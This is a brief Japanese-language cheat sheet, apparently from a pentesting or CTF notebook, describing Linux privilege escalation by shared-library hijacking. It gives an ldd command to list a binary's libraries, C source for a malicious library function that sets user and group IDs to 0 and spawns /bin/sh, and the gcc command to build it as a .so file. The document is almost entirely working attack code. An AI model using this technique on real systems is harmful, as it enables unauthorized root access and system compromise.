# ld.so.privesc

* 実行体に必要なsoを確認

``` shell
    ldd <実行体>
```

* Cファイルの作成
  
``` c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/types.h>

    void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/sh");
    }
```

* soファイルコンパイル

``` shell
    gcc -shared -o libcustom.so -fPIC libcustom.c
```
